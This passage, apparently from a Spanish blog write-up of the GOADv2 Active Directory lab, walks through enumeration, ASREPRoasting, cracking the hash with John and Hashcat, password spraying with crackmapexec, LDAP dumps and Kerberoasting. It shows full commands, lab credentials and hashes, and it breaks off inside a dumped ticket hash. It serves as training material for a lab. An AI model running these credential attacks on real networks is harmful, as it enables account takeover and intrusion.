Group 'Stark' (RID: 1106) has member: NORTH\eddard.stark
Group 'Stark' (RID: 1106) has member: NORTH\catelyn.stark
Group 'Stark' (RID: 1106) has member: NORTH\robb.stark
Group 'Stark' (RID: 1106) has member: NORTH\sansa.stark
Group 'Stark' (RID: 1106) has member: NORTH\brandon.stark
Group 'Stark' (RID: 1106) has member: NORTH\rickon.stark
Group 'Stark' (RID: 1106) has member: NORTH\hodor
Group 'Stark' (RID: 1106) has member: NORTH\jon.snow
Group 'Domain Computers' (RID: 515) has member: NORTH\CASTELBLACK$
Group 'Domain Users' (RID: 513) has member: NORTH\Administrator
Group 'Domain Users' (RID: 513) has member: NORTH\vagrant
Group 'Domain Users' (RID: 513) has member: NORTH\krbtgt
Group 'Domain Users' (RID: 513) has member: NORTH\SEVENKINGDOMS$
Group 'Domain Users' (RID: 513) has member: NORTH\arya.stark
Group 'Domain Users' (RID: 513) has member: NORTH\eddard.stark
Group 'Domain Users' (RID: 513) has member: NORTH\catelyn.stark
Group 'Domain Users' (RID: 513) has member: NORTH\robb.stark
Group 'Domain Users' (RID: 513) has member: NORTH\sansa.stark
Group 'Domain Users' (RID: 513) has member: NORTH\brandon.stark
Group 'Domain Users' (RID: 513) has member: NORTH\rickon.stark
Group 'Domain Users' (RID: 513) has member: NORTH\hodor
Group 'Domain Users' (RID: 513) has member: NORTH\jon.snow
Group 'Domain Users' (RID: 513) has member: NORTH\samwell.tarly
Group 'Domain Users' (RID: 513) has member: NORTH\jeor.mormont
Group 'Domain Users' (RID: 513) has member: NORTH\sql_svc
Group 'Night Watch' (RID: 1107) has member: NORTH\jon.snow
Group 'Night Watch' (RID: 1107) has member: NORTH\samwell.tarly
Group 'Night Watch' (RID: 1107) has member: NORTH\jeor.mormont
Group 'Mormont' (RID: 1108) has member: NORTH\jeor.mormont
Group 'Group Policy Creator Owners' (RID: 520) has member: NORTH\Administrator

 ======================================================================== 
|    Users on 192.168.56.11 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================== 
|    Getting printer info for 192.168.56.11    |
 ============================================== 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Tue Jul  4 20:37:56 2023
```

---

# Buscar contraseñas con Usuarios Enumerados

Vamos a realizar un ataque llamado ASREPRoast con el comando. `GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt` 

## ASREPRoast

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt 
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User SEVENKINGDOMS$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95c6c08959ef52b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99977b8cd7b9e55ebb464dc9a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0c9fa019ea8babd115cbcdc2af6d54d6c5f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

El TGT que se nos proporcionó se ha guardado en un archivo para crackearlo posteriormente. 

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cat hashbrandon.stark 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hashbrandon.stark
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95
       │ c6c08959ef52b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99
       │ 977b8cd7b9e55ebb464dc9a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0
       │ c9fa019ea8babd115cbcdc2af6d54d6c5f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Intentaremos descifrar este hash utilizando John the Ripper o Hashcat. Vamos a intentar ambas opciones. Con John, el comando es el siguiente:`john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)
1g 0:00:00:00 DONE (2023-07-05 20:15) 9.090g/s 502690p/s 502690c/s 502690C/s lileth..grad2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Mientras que con Hashcat se utiliza el comando. `hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 5808/5872 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 169 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95c6c08959ef5
2b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99977b8cd7b9e55ebb464dc9
a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0c9fa019ea8babd115cbcdc2af6d54d6c5
f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8:iseedeadpeople
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...f29cd8
Time.Started.....: Wed Jul  5 20:29:39 2023 (1 sec)
Time.Estimated...: Wed Jul  5 20:29:40 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   179.3 kH/s (8.50ms) @ Accel:32 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 61440/14344385 (0.43%)
Rejected.........: 0/61440 (0.00%)
Restore.Point....: 49152/14344385 (0.34%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: truckin -> sinead1

Started: Wed Jul  5 20:28:10 2023
Stopped: Wed Jul  5 20:29:42 2023
```

## Password Spray

Realizaremos un ataque de "Password Spray", mediante crackmapexec, utilizando el comando `cme smb 192.168.56.11 -u User_nort.txt -p User_nort.txt --no-bruteforce`. Si el programa encuentra un usuario, se detendrá. Para evitar esto, se debe agregar la bandera `-continue-on-success`.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 -u User_nort.txt -p User_nort.txt --no-bruteforce
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\alliser.thorne:alliser.thorne STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\archmaester.ebrose:archmaester.ebrose STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\balon.greyjoy:balon.greyjoy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\barristan.selmy:barristan.selmy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\benjen.stark:benjen.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\beric.dondarrion:beric.dondarrion STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\bran.stark:bran.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brienne.of:brienne.of STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\bronn:bronn STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brother.ray:brother.ray STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brynden.tully:brynden.tully STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\cersei.lannister:cersei.lannister STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\daario.naharis:daario.naharis STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\daenerys.targaryen:daenerys.targaryen STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\davos.seaworth:davos.seaworth STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\doran.martell:doran.martell STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\euron.greyjoy:euron.greyjoy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\gendry:gendry STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\gilly:gilly STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\grand.maester:grand.maester STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\grey.worm:grey.worm STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\high.priestess:high.priestess STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\high.sparrow:high.sparrow STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
```

---

# Enumeración Con Usuarios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%202.png)

Para obtener una lista completa de los usuarios, se utiliza la herramienta GetADUsers con el siguiente comando:`GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-01-25 00:33:26.355985  2023-01-25 01:29:42.829335 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 06:38:55.922520  2023-07-05 19:35:25.217332 
krbtgt                                                2023-01-25 00:44:27.813224  <never>             
                                                      2023-06-27 20:38:03.432290  <never>             
arya.stark                                            2023-01-25 00:59:58.115942  <never>             
eddard.stark                                          2023-01-25 01:00:00.289774  2023-07-05 21:35:38.349434 
catelyn.stark                                         2023-01-25 01:00:02.257672  <never>             
robb.stark                                            2023-01-25 01:00:04.166841  2023-07-06 18:21:25.977609 
sansa.stark                                           2023-01-25 01:00:06.006788  <never>             
brandon.stark                                         2023-01-25 01:00:07.850550  2023-07-05 20:10:58.504164 
rickon.stark                                          2023-01-25 01:00:09.647602  <never>             
hodor                                                 2023-01-25 01:00:11.381523  <never>             
jon.snow                                              2023-01-25 01:00:13.100407  <never>             
samwell.tarly                                         2023-01-25 01:00:14.897380  <never>             
jeor.mormont                                          2023-01-25 01:00:16.647458  <never>             
sql_svc                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
```

Otra opción es obtener una lista de usuarios mediante LDAP utilizando el siguiente comando: `ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
distinguishedName: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=loc
distinguishedName: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
```

## Volcado con ldapdomaindump

También es posible emplear la herramienta [ldapdomandump](https://github.com/dirkjanm/ldapdomaindump){:target="_blank"} con el propósito de llevar a cabo el proceso de volcado de datos

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #python3 /mnt/angussMoody/Scripts/Windows/ldapdomaindump/ldapdomaindump.py -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' 192.168.56.11
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Como resultado de este proceso, se generan archivos.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll domain_*
Permissions Size User        Date Modified Name
.rwxrwxrwx   626 angussmoody  6 jul 18:40  domain_computers.grep
.rwxrwxrwx  1,7k angussmoody  6 jul 18:40  domain_computers.html
.rwxrwxrwx  7,9k angussmoody  6 jul 18:40  domain_computers.json
.rwxrwxrwx  1,7k angussmoody  6 jul 18:40  domain_computers_by_os.html
.rwxrwxrwx  9,6k angussmoody  6 jul 18:40  domain_groups.grep
.rwxrwxrwx   16k angussmoody  6 jul 18:40  domain_groups.html
.rwxrwxrwx   83k angussmoody  6 jul 18:40  domain_groups.json
.rwxrwxrwx   259 angussmoody  6 jul 18:40  domain_policy.grep
.rwxrwxrwx  1,2k angussmoody  6 jul 18:40  domain_policy.html
.rwxrwxrwx  6,5k angussmoody  6 jul 18:40  domain_policy.json
.rwxrwxrwx   182 angussmoody  6 jul 18:40  domain_trusts.grep
.rwxrwxrwx   997 angussmoody  6 jul 18:40  domain_trusts.html
.rwxrwxrwx  1,8k angussmoody  6 jul 18:40  domain_trusts.json
.rwxrwxrwx  4,2k angussmoody  6 jul 18:40  domain_users.grep
.rwxrwxrwx   12k angussmoody  6 jul 18:40  domain_users.html
.rwxrwxrwx   43k angussmoody  6 jul 18:40  domain_users.json
.rwxrwxrwx   20k angussmoody  6 jul 18:40  domain_users_by_group.html
```

Podemos crear un servidor HTTP utilizando Python

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Después de configurar el servidor, puedes acceder a través de tu navegador en "localhost" para visualizar los archivos y cargarlos directamente desde ahí

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%203.png)

Cuando observamos el archivo "domain_users.html", por ejemplo su contenido se presenta de la siguiente forma.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%204.png)

Pedemos observar también que se establece una conexión con "sevenkingdoms.local” en el archivo llamado domain_trusts.html

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%205.png)

Utilizando las credenciales de este usuario, es posible realizar una enumeración de los usuarios presentes en "sevenkingdoms.local", debido a la existencia de una relación de confianza entre los dominios.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
distinguishedName: CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=Guest,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=NORTH$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=ESSOS$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=tywin.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=cersei.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=robert.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=renly.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=stannis.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=petyer.baelish,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=lord.varys,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
```

Tenemos un listado completo de los usuarios de "sevenkingdoms.local"

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cat 10_Users_sevenkingdoms.local 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 10_Users_sevenkingdoms.local
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ vagrant
   4   │ krbtgt
   5   │ NORTH$
   6   │ ESSOS$
   7   │ tywin.lannister
   8   │ jaime.lannister
   9   │ cersei.lannister
  10   │ tyron.lannister
  11   │ robert.baratheon
  12   │ joffrey.baratheon
  13   │ renly.baratheon
  14   │ stannis.baratheon
  15   │ petyer.baelish
  16   │ lord.varys
  17   │ maester.pycelle
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Kerberoasting

Además, se tiene la posibilidad de ejecutar un ataque conocido como "Kerberoasting". Al usar el comando `GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople` se logra la identificación de dos usuarios adicionales

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
```

Ahora se procederá a obtener los TGS (Service Tickets) con el comando `GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes` con esto exportamos los TGS en un archivo llamado kerberoasting.hashes

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              

[-] CCache file is not found. Skipping...
```

Se procede a la lectura del archivo recién creado con el comando `cat kerberoasting.hashes`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cat kerberoasting.hashes 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: kerberoasting.hashes
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$ec59cb8d62227338637e3d8d6f3feeb6$c8458e7a942e7f7a14fe5a4db528cbd2dca48211ea5eb8177415530
       │ 98b24f8be6e7118e89a2262b155f4de988263c3fcc16f364097bca8ac9eb4cadfacaadae792517824790a3ac98c9ed6fa7c1be3058d5d787e26a62dcc69dc15efd3312aab578ee93d60fc11b811e0ac9ce5101978db1
       │ ead260ba1a617d2af71831d7a2fa8e167e4a54fe7f6b656a24ee3ff073bdf87073a1298adbf8df35fc1d639fe7c0026ab5007336e2095919d9c9bd0921ad66a02e1a491ff38ecdc3d2d54ae4c1e9d7d2c4bc41cc5fb4
       │ c95f45ad4f43b4d4541292cb347aea060f9d61fb9582eb7eb0e026066262a2e71f418d1d66928f27ff05aaeaccdbbaaa9375003da6d37db12539368ea760353011bb56270d5c062d4ecee0ca62abedcde4b5033372c8
       │ f470e361610ad9cbd3a848739be2c36d2a9d666912e264b2b7a01958d176c82c9202eeeb36d33a0a5fa75f3691d8ffbe4d38b3f8921ce11a7f1f4e128b69ea352d5f03595217b83f3609fe264a65f55c660c47f2bf6f
       │ 20fbd3eb9ffeb919a3caa653a9dea88ca7ea2543f045d932ade153bf259a1070f60a85c569874021c87320d6baeae9becd0335761724859e914b67184b637d38892b243c671cc35b5ae2f44fe92013775e773386a7b8
       │ 25c3c635b83b3f21e9e071628638be0ffa16807282921c10a252827179a194b1f2b04a812f04134daa06db2f258b544b4a38e9263bc2d2fd146bb45fc3d27f6afffdf3835f0345bde3a9f8792681eb9986337bdc72c0
       │ 71e78b70b47f2cd715298329bdb496a5aa474ebfc3725b464fddbd57424530fde1161d22715057fa5fa125273dd05683b7d9152dc1bac2fadf8ecf0eed59e9598dc8a73ea3d1d149816344d683d2e6bda41a09014d79
